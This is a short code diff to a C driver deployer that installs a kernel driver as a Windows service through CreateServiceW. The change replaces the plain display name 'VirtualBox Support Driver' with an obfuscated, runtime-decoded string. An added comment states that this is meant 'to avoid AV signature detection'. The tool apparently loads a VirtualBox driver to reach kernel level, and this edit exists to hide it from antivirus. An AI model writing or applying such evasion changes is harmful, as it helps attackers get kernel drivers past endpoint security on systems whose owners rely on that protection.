@@ -6,6 +6,7 @@
 #include "deployer.h"
 #include "crypto.h"
 #include "nt_defs.h"
+#include "../obfuscate.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -766,8 +767,9 @@ bool Deployer_DeployViaSCM(PDEPLOYER_CTX ctx, const DRIVER_RESOURCE* pResource) 
     }
 
     // Create service
+    // Use obfuscated display name to avoid AV signature detection
     ctx->hService = CreateServiceW(
-        ctx->hSCManager, ctx->wszServiceName, L"VirtualBox Support Driver",
+        ctx->hSCManager, ctx->wszServiceName, DEC_VBOX_DRIVER_W(),
         SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
         SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
         wszTargetPath, NULL, NULL, NULL, NULL, NULL
